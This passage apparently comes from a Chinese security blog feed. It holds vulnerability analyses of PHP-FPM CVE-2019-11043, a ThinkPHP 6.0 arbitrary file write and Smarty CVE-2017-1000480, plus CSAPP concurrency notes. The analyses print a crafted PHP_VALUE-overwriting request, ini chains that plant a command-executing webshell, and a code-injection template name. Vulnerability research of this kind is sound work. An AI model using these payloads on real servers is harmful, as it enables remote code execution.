class="keyword">int</span> hash_value, <span class="keyword">char</span> *var, <span class="keyword">unsigned</span> <span class="keyword">int</span> var_len, <span class="keyword">unsigned</span> <span class="keyword">int</span> *val_len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>      idx = hash_value &amp; FCGI_HASH_TABLE_MASK;</span><br><span class="line">    fcgi_hash_bucket *p = h-&gt;hash_table[idx];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;hash_value == hash_value &amp;&amp;</span><br><span class="line">        p-&gt;var_len == var_len &amp;&amp;</span><br><span class="line">        <span class="built_in">memcmp</span>(p-&gt;var, var, var_len) == <span class="number">0</span>) &#123;</span><br><span class="line">        *val_len = p-&gt;val_len;</span><br><span class="line">        <span class="keyword">return</span> p-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">    p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这里，hashtable 的作用发挥出来了，先以 hash_value 为索引查一下，再比较 var 的值是否相同，很严格。</p><p>要想写进去的 PHP_VALUE 能用起来的话，还有个问题没有解决，hash_value 对不上，曲线救国！</p><p>整理一下我们现在有哪些条件了：</p><ul><li>hash_value 的计算很简单，非常容易产生一样的值。</li><li>对在 fcgi_data_seg 中存储的参数可以直接写入或者覆盖。 </li></ul><p>利用哈希函数的缺陷，先搞一个进哈希表，去占个位，再通过 memcpy 进行更名。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FCGI_HASH(&quot;HTTP_EBUT&quot;) == FCGI_HASH(&quot;PHP_VALUE&quot;) == 2015</span><br><span class="line">strlen(&quot;HTTP_EBUT&quot;) == strlen(&quot;PHP_VALUE&quot;) == 9</span><br></pre></td></tr></table></figure><p>怎么知道多久才覆盖成功了？写入 session.auto_start=1。</p><p>当服务器返回 <code>Set-Cookie</code> 头的时候，就说明了 <code>PHP_VALUE</code> 覆盖成功了。</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php/PHP_VALUE%0Asession.auto_start=1;;;?QQQQQQQQQQQQQQQQQQQQQ....</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0</span><br><span class="line"><span class="attribute">D-Pisos</span>: 8===========================================================D</span><br><span class="line"><span class="attribute">Ebut</span>: mamku tvoyu</span><br></pre></td></tr></table></figure><p>其中 D-Pisos 是拿来调节位置的，结合上面打印的 request-&gt;env-&gt;data 内存更容易看清楚。</p><p>另外，我觉得 PHP_VALUE 的值可以直接从 Ebut 写入，只要把 HTTP_EBUT 换成 PHP_VALUE，不用整个覆盖。</p><p><strong>怎么 RCE？</strong></p><p>作者想到了这样的一条链，进一步的实现细节建议直接去看作者的 <a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">exp</a>。</p><p>需要注意的是，为了将空字节准确地放置在地址中，偏移的值固定为 34，所以不能超过，少了就用 <code>;</code> 填充。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> chain = []<span class="keyword">string</span>&#123;</span><br><span class="line">    <span class="string">"short_open_tag=1"</span>, <span class="comment">// 开启php短标签</span></span><br><span class="line">    <span class="string">"html_errors=0"</span>,   <span class="comment">// 在错误信息中关闭HTML标签</span></span><br><span class="line">    <span class="string">"include_path=/tmp"</span>,  <span class="comment">// 包含路径</span></span><br><span class="line">    <span class="string">"auto_prepend_file=a"</span>,  <span class="comment">// 指定脚本执行前自动包含的文件</span></span><br><span class="line">    <span class="string">"log_errors=1"</span>,  <span class="comment">// 使能错误日志</span></span><br><span class="line">    <span class="string">"error_reporting=2"</span>,   <span class="comment">// 指定错误级别</span></span><br><span class="line">    <span class="string">"error_log=/tmp/a"</span>,  <span class="comment">// 错误日志记录文件</span></span><br><span class="line">    <span class="string">"extension_dir=\"&lt;?=\`\""</span>,   <span class="comment">// 指定extension的加载目录</span></span><br><span class="line">    <span class="string">"extension=\"$_GET[a]\`?&gt;\""</span>, <span class="comment">// 指定加载的extension</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>orange 给了这样的链。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">inis = [</span><br><span class="line">    <span class="string">"error_reporting=2"</span>,</span><br><span class="line">    <span class="string">"short_open_tag=1"</span>,</span><br><span class="line">    <span class="string">"html_errors=0"</span>,</span><br><span class="line">    <span class="string">"log_errors=1"</span>,</span><br><span class="line">    <span class="string">"output_handler=&lt;?/*"</span>,</span><br><span class="line">    <span class="string">"output_handler=*/`"</span>,</span><br><span class="line">    <span class="string">"output_handler=''"</span>,</span><br><span class="line">    <span class="string">"extension_dir='`?&gt;'"</span>,</span><br><span class="line">    <span class="string">"extension=$_GET[a]"</span>,</span><br><span class="line">    <span class="string">"error_log  = /tmp/l"</span>,</span><br><span class="line">    <span class="string">"include_path=/tmp"</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一步一步深挖，直到 RCE。真是化腐朽为神奇，钦佩这样的技术大佬。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://bugs.php.net/bug.php?id=78599" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78599</a></p><p><a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">https://github.com/neex/phuip-fpizdam</a></p><p><a href="https://lab.wallarm.com/php-remote-code-execution-0-day-discovered-in-real-world-ctf-exercise/" target="_blank" rel="noopener">https://lab.wallarm.com/php-remote-code-execution-0-day-discovered-in-real-world-ctf-exercise/</a></p><p><a href="https://blog.orange.tw/2019/10/an-analysis-and-thought-about-recently.html" target="_blank" rel="noopener">https://blog.orange.tw/2019/10/an-analysis-and-thought-about-recently.html</a></p><p><a href="https://blog.wonderkun.cc/2019/10/27/php-fpm" target="_blank" rel="noopener">https://blog.wonderkun.cc/2019/10/27/php-fpm</a> RCE的POC的理解剖析(CVE-2019-11043)/</p><p><a href="https://coding.imooc.com/class/312.html" target="_blank" rel="noopener">https://coding.imooc.com/class/312.html</a></p><p><a href="https://segmentfault.com/a/1190000016868502" target="_blank" rel="noopener">https://segmentfault.com/a/1190000016868502</a></p><p><a href="https://www.nginx.com/resources/wiki/start/topics/examples/phpfcgi/" target="_blank" rel="noopener">https://www.nginx.com/resources/wiki/start/topics/examples/phpfcgi/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，向目标服务器 URL 发送 &lt;code&gt;%0a&lt;/code&gt; 符号时，
      
    
    </summary>
    
    
      <category term="漏洞分析" scheme="https://wywwzjj.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://wywwzjj.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 6.0 任意文件写入</title>
    <link href="https://wywwzjj.top/2020/01/17/ThinkPHP-6.0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/"/>
    <id>https://wywwzjj.top/2020/01/17/ThinkPHP-6.0-任意文件写入/</id>
    <published>2020-01-17T05:23:27.000Z</published>
    <updated>2020-03-22T10:11:48.078Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>2020 年 1 月 10 日，ThinkPHP 团队发布一个补丁更新，修复了一处由不安全的 SessionId 导致的任意文件操作漏洞。</p><p>该漏洞允许攻击者在目标环境启用 session 的条件下创建任意文件以及删除任意文件，在特定情况下可 getshell。</p><p>具体受影响版本为 ThinkPHP 6.0.0 - 6.0.1。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>composer 创建项目。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=6.0.0 thinkphp6.0.0</span><br></pre></td></tr></table></figure><p>在 app/controller/Index.php 中加一行代码，使 session 内容可控，方便漏洞复现。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        session(<span class="string">'test'</span>, input(<span class="string">'j'</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>PS：TP 6 默认没开启 session，手动开下，在 app/middleware.php 取消注释即可。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 全局中间件定义文件</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 全局请求缓存</span></span><br><span class="line">    <span class="comment">// \think\middleware\CheckRequestCache::class,</span></span><br><span class="line">    <span class="comment">// 多语言加载</span></span><br><span class="line">    <span class="comment">// \think\middleware\LoadLangPack::class,</span></span><br><span class="line">    <span class="comment">// Session初始化</span></span><br><span class="line">     \think\middleware\SessionInit::class</span><br><span class="line">];</span><br></pre></td></tr></table></figure><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gb4a0ti4lcj213e0720tb.jpg" alt="image.png"></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gb49ddcctkj20jr07lgt2.jpg" alt="image.png"></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gb49jb7nx7j213g09lt9q.jpg" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><a href="https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2</a></p><p>如果传入的 $id 长度为 32 即可控。TP 6.0.2 加了个条件，用 <code>ctype_alnum</code> 检测了下 ​$id，只能是字母或数字。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># src/think/session/Store.php</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;id = is_string($id) &amp;&amp; strlen($id) === <span class="number">32</span> ? $id : md5(microtime(<span class="keyword">true</span>) . session_create_id());</span><br></pre></td></tr></table></figure><p><code>handle</code> 函数将 cookie 中的 <code>PHPSESSID</code> 对应的值设为 sessionId。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// middleware/SessionInit.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">($request, Closure $next)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Session初始化</span></span><br><span class="line">    $varSessionId = <span class="keyword">$this</span>-&gt;app-&gt;config-&gt;get(<span class="string">'session.var_session_id'</span>);</span><br><span class="line">    $cookieName   = <span class="keyword">$this</span>-&gt;session-&gt;getName();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) &#123;</span><br><span class="line">        $sessionId = $request-&gt;request($varSessionId);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $sessionId = $request-&gt;cookie($cookieName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($sessionId) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;session-&gt;setId($sessionId);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gb48yn48kvj20ph0263yf.jpg" alt="image.png"></p><p>剩下的文件处理其实就是 session 本身的处理了，比如 $_SESSION 数组被序列化后写入文件保存以及清除。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// src/think/session/Store.php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 保存session数据</span></span><br><span class="line"><span class="comment">* <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span>: <span class="title">void</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;clearFlashData();</span><br><span class="line">    $sessionId = <span class="keyword">$this</span>-&gt;getId();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler-&gt;write($sessionId, $data);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// data 为空就进行删除</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler-&gt;delete($sessionId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;init = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进 <code>$this-&gt;handler-&gt;write($sessionId, $data);</code> 的具体实现。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// session/driver/File.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(string $sessID, string $sessData)</span>: <span class="title">bool</span> </span>&#123;</span><br><span class="line">    $filename = <span class="keyword">$this</span>-&gt;getFileName($sessID, <span class="keyword">true</span>);</span><br><span class="line">    $data     = $sessData;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">        <span class="comment">//数据压缩</span></span><br><span class="line">        $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;writeFile($filename, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里就落实到 file_put_contents() 了</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span><span class="params">($path, $content)</span>: <span class="title">bool</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (bool) file_put_contents($path, $content, LOCK_EX);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说还是比较鸡肋，需要能控制 session，直接打不了。</p><p>所以要与具体的业务结合，寻找 session 的输入点，比如某些系统将用户名直接存入 session 中。</p><p>另外，那个删除点就更难控制了，那也是 TP 清除 session 的正常功能，所以能删的文件必须以 <code>sess_</code> 开头。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/UPu6cE20l24T6fkYOlSUJw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/UPu6cE20l24T6fkYOlSUJw</a></p><p><a href="https://mochazz.github.io/2020/01/14/ThinkPHP6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99" target="_blank" rel="noopener">https://mochazz.github.io/2020/01/14/ThinkPHP6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;2020 年 1 月 10 日，ThinkPHP 团队发布一个补丁更新，修复了一处由不安全的 SessionId 导致的任意文件操作漏洞。&lt;
      
    
    </summary>
    
    
      <category term="漏洞分析" scheme="https://wywwzjj.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://wywwzjj.top/tags/PHP/"/>
    
      <category term="ThinkPHP" scheme="https://wywwzjj.top/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 并发编程 笔记</title>
    <link href="https://wywwzjj.top/2019/12/16/CSAPP-Chapter-12-Notes/"/>
    <id>https://wywwzjj.top/2019/12/16/CSAPP-Chapter-12-Notes/</id>
    <published>2019-12-16T12:47:57.000Z</published>
    <updated>2020-03-22T10:11:48.052Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基于进程的并发"><a href="#基于进程的并发" class="headerlink" title="基于进程的并发"></a>基于进程的并发</h2><p>基于进程的并发服务器</p><p>进程的优劣</p><h2 id="基于-I-O-多路复用的并发"><a href="#基于-I-O-多路复用的并发" class="headerlink" title="基于 I/O 多路复用的并发"></a>基于 I/O 多路复用的并发</h2><p>基于 I/O 多路复用的并发事件驱动服务器</p><p>I/O 多路复用技术的优劣</p><h2 id="基于线程的并发"><a href="#基于线程的并发" class="headerlink" title="基于线程的并发"></a>基于线程的并发</h2><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><ul><li>用户线程</li><li>内核线程</li><li>轻量级进程：内核中实现，支持用户线程（Solaris）</li></ul><p>管理、控制线程的模块称作线程包。</p><p>线程模型中，由一个线程作为协调者来分派任务，而其他线程负责处理任务的模型称作分派/工作模型。</p><p>各线程相互独立，每个线程可单独完成任务的接收、处理、结果返回的模型称作队列模型。</p><p>进程 = 资源 + 指令执行序列</p><p>是否可以资源不动而切换指令序列？可！只切PC！保留了并发的优点，避免了进程切换的代价。从而引入线程。</p><p>线程切换：TCB 与栈互相配合。</p><p>yield，next，突然想起了py的协程</p><h3 id="与进程的区别"><a href="#与进程的区别" class="headerlink" title="与进程的区别"></a>与进程的区别</h3><p>线程：处理器分配调度的基本单位，进程内资源所有线程共享，线程切换开销小</p><p>进程：其他资源（除处理器外）分配的基本单位，进程切换开销大</p><p>进程可以创建线程、子进程，线程只能创建线程。</p><p>线程执行模型</p><p>POSIX 线程</p><p>创建线程</p><p>终止线程</p><p>回收已终止线程的资源</p><p>分离线程</p><p>初始化线程</p><p>基于线程的并发服务器</p><h2 id="多线程程序中的共享变量"><a href="#多线程程序中的共享变量" class="headerlink" title="多线程程序中的共享变量"></a>多线程程序中的共享变量</h2><p>线程内存模型</p><p>将变量映射到内存</p><p>共享变量</p><h2 id="用信号量同步线程"><a href="#用信号量同步线程" class="headerlink" title="用信号量同步线程"></a>用信号量同步线程</h2><h3 id="进度图"><a href="#进度图" class="headerlink" title="进度图"></a>进度图</h3><h3 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h3><p>用户进程可以通过使用操作系统提供的<strong>一对原语</strong>来对<strong>信号量</strong>进行操作。</p><p>信号在进程间通信、同步起到了重要的作用，但信号表示的含义有限，信号 =&gt; 信号量。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semaphore</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> value;</span><br><span class="line">    PCB* <span class="built_in">queue</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">P(semaphore s) &#123;</span><br><span class="line">    s.value--;</span><br><span class="line">    <span class="keyword">if</span> (s.value &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        sleep(s.<span class="built_in">queue</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">V(semaphore s) &#123;？</span><br><span class="line">    s.value++;</span><br><span class="line">    <span class="keyword">if</span> (s.value &lt;= <span class="number">0</span>) &#123;  <span class="comment">// &lt;= 0，暂无资源还去唤醒？</span></span><br><span class="line">        wakeup(s.<span class="built_in">queue</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>P 消费资源。来自荷兰语的 problem，即 test。</p></li><li><p>V 生产资源。来自荷兰语 verhogen，即 increment。</p></li></ul><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><h5 id="信号量的双用途"><a href="#信号量的双用途" class="headerlink" title="信号量的双用途"></a>信号量的双用途</h5><ul><li>互斥和条件同步</li><li>但等待条件是独立的互斥</li></ul><h5 id="容易出错"><a href="#容易出错" class="headerlink" title="容易出错"></a>容易出错</h5><ul><li>使用的信号量已经被另一个线程占用</li><li>忘记释放信号量</li></ul><h5 id="不能够处理死锁问题"><a href="#不能够处理死锁问题" class="headerlink" title="不能够处理死锁问题"></a>不能够处理死锁问题</h5><h4 id="互斥"><a href="#互斥" class="headerlink" title="互斥"></a>互斥</h4><p>mutex = 1</p><h4 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h4><p>xxx = 0</p><h4 id="前驱"><a href="#前驱" class="headerlink" title="前驱"></a>前驱</h4><p>每一个前置都能看成一个同步关系</p><p>信号量</p><p>使用信号量实现互斥</p><p>利用信号量来调度共享资源</p><p>综合：基于预线程化的并发服务器</p><h2 id="使用线程提供并行性"><a href="#使用线程提供并行性" class="headerlink" title="使用线程提供并行性"></a>使用线程提供并行性</h2><h2 id="其他线程并发问题"><a href="#其他线程并发问题" class="headerlink" title="其他线程并发问题"></a>其他线程并发问题</h2><p>线程安全</p><p>可重入性</p><p>在线程化的程序中使用已存在的库函数</p><p>竞争</p><p>死锁</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基于进程的并发&quot;&gt;&lt;a href=&quot;#基于进程的并发&quot; class=&quot;headerlink&quot; title=&quot;基于进程的并发&quot;&gt;&lt;/a&gt;基于进程的并发&lt;/h2&gt;&lt;p&gt;基于进程的并发服务器&lt;/p&gt;
&lt;p&gt;进程的优劣&lt;/p&gt;
&lt;h2 id=&quot;基于-I-O-多路复用的并发
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>smarty 3.1.31 RCE（CVE-2017-1000480）</title>
    <link href="https://wywwzjj.top/2019/12/15/smarty-3.1.31-RCE/"/>
    <id>https://wywwzjj.top/2019/12/15/smarty-3.1.31-RCE/</id>
    <published>2019-12-15T15:00:26.000Z</published>
    <updated>2020-03-22T10:11:48.080Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>smarty 模板的使用比较简单，主要有两个核心函数。一个是 <code>assign()</code>，把模板中要使用的数据进行欲赋值，一个是 <code>display()</code>，用来解析和展示最后的视图模板。</p><p>CVE 描述信息：</p><blockquote><p>Smarty 3 before 3.1.32 is vulnerable to a PHP code injection when calling fetch() or display() functions on custom resources that does not sanitize template name.</p></blockquote><p>信息的源头，更新日志：<a href="https://github.com/smarty-php/smarty/blob/master/change_log.txt" target="_blank" rel="noopener">https://github.com/smarty-php/smarty/blob/master/change_log.txt</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">21.7.2017</span><br><span class="line">  - security possible PHP code injection on custom resources at display() or fetch()</span><br><span class="line">    calls if the resource does not sanitize the template name</span><br></pre></td></tr></table></figure><p><strong>影响版本</strong></p><p>smarty &lt;= 3.1.21</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>可以把项目 clone 下来，再切到 <strong>v3.1.31</strong>。我这里是用 composer 创的。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git checkout tags/v3.1.31 -b v3.1.21-debug</span><br></pre></td></tr></table></figure><p>Insomni’hack teaser 2018 拿这个点出了个题 <a href="https://ctftime.org/task/5185" target="_blank" rel="noopener">Smart-Y</a>，这有 wp <a href="https://ctftime.org/writeup/8552。" target="_blank" rel="noopener">https://ctftime.org/writeup/8552。</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// load Smarty library</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">news</span> <span class="keyword">extends</span> <span class="title">Smarty_Resource_Custom</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($name, &amp;$source, &amp;$mtime)</span> </span>&#123;</span><br><span class="line">        $template = <span class="string">"CVE-2017-1000480 smarty PHP code injection"</span>;</span><br><span class="line">        $source = $template;</span><br><span class="line">        $mtime = time();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Smarty configuration</span></span><br><span class="line">$smarty = <span class="keyword">new</span> Smarty();</span><br><span class="line">$my_security_policy = <span class="keyword">new</span> Smarty_Security($smarty);</span><br><span class="line">$my_security_policy-&gt;php_functions = <span class="keyword">NULL</span>;</span><br><span class="line">$my_security_policy-&gt;php_handling = Smarty::PHP_REMOVE;</span><br><span class="line">$my_security_policy-&gt;modifiers = <span class="keyword">array</span>();</span><br><span class="line">$smarty-&gt;enableSecurity($my_security_policy);</span><br><span class="line">$smarty-&gt;setCacheDir(<span class="string">'cache'</span>);</span><br><span class="line">$smarty-&gt;setCompileDir(<span class="string">'compile'</span>);</span><br><span class="line"></span><br><span class="line">$smarty-&gt;registerResource(<span class="string">'news'</span>, <span class="keyword">new</span> news);</span><br><span class="line">$smarty-&gt;display(<span class="string">'news:'</span> . $_GET[<span class="string">'j'</span>]);</span><br></pre></td></tr></table></figure><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gb594lta6rj213g08rjsc.jpg" alt="image.png"></p><p>注释符还可以用 <code>*/phpinfo();/*</code>，但 Windows 下文件名不能含有 <code>\/:*?&quot;&lt;&gt;|</code>，所以 <code>//</code> 更通用。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbgwcnjy0vj20k70cgwp0.jpg" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先看下官方给的补丁。</p><p><a href="https://github.com/smarty-php/smarty/commit/614ad1f8b9b00086efc123e49b7bb8efbfa81b61" target="_blank" rel="noopener">https://github.com/smarty-php/smarty/commit/614ad1f8b9b00086efc123e49b7bb8efbfa81b61</a></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbgwyts9ctj20rf0l5q4u.jpg" alt="image.png"></p><p>PoC 生成的临时文件如下。如果没有 PoC，那就随便输一点内容测试一下。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* Smarty version 3.1.31, created on 2020-02-01 14:42:38</span></span><br><span class="line"><span class="comment">  from "news:*/</span>phpinfo();<span class="comment">//" */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* <span class="doctag">@var</span> Smarty_Internal_Template $_smarty_tpl */</span></span><br><span class="line">  <span class="string">'has_nocache_code'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">  <span class="string">'file_dependency'</span> =&gt;</span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'1f7fa551e77a29c48c7ac4143a2b811ca7e38ce5'</span> =&gt;</span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="number">0</span> =&gt; <span class="string">'news:*/phpinfo();//'</span>,</span><br><span class="line">      <span class="number">1</span> =&gt; <span class="number">1580539358</span>,</span><br><span class="line">      <span class="number">2</span> =&gt; <span class="string">'news'</span>,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">CVE<span class="number">-2017</span><span class="number">-1000480</span> smarty PHP code injection<span class="meta">&lt;?php</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合上面的内容来看，模板显然是从这里产生的。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$output = <span class="string">"&lt;?php\n"</span>;</span><br><span class="line">$output .= <span class="string">"/* Smarty version "</span> . Smarty::SMARTY_VERSION . <span class="string">", created on "</span> . strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>) .</span><br><span class="line">    <span class="string">"\n  from \""</span> . $_template-&gt;source-&gt;filepath . <span class="string">"\" */\n\n"</span>;</span><br><span class="line">$output .= <span class="string">"/* @var Smarty_Internal_Template \$_smarty_tpl */\n"</span>;</span><br></pre></td></tr></table></figure><p>$_template-&gt;source-&gt;filepath 这个变量的内容一旦把前面的注释符闭合，就能插入 PHP 代码。</p><p>所以官方打的补丁也是针对这些输出点进行过滤。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>文档地址：<a href="https://www.smarty.net/docs/zh_CN/" target="_blank" 